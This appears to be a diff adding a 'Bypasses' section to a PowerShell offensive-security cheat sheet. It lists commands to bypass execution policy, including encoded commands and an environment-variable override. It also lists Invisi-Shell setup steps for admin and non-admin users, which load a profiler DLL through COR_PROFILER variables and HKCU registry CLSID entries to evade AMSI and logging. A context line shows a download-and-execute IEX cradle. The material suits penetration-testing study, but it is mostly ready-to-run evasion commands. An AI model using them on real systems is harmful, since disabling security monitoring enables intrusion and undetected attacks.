@@ -40,3 +40,61 @@ IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
 - AMSI (AntMalware Scan Interface)
 - CLM (Constrained Language Mode)
  - Integration with Applocker & WDAC (Device Guard)
+
+#### Bypasses
+##### Execution Policy
+:heavy_check_mark:
+```
+powershell -ExecutionPolicy bypass
+```
+```
+powershell -c <cmd>
+```
+:heavy_check_mark:
+```
+powershell -encodedcommand
+```
+$env:PSExecutionPolicyPreference="bypass"
+```
+
+##### Security
+
+[Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) :sparkles:
+
+**with admin privileges**
+```
+set COR_ENABLE_PROFILING=1
+set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll
+
+powershell
+
+set COR_ENABLE_PROFILING=
+set COR_PROFILER=
+set COR_PROFILER_PATH=
+```
+
+**with non-admin privileges**
+```
+set COR_ENABLE_PROFILING=1
+set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f
+
+powershell
+
+set COR_ENABLE_PROFILING=
+set COR_PROFILER=
+REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+```
+
+:broom: can be cleaned up with an *exit* command
+
+
+
+
+
+
+
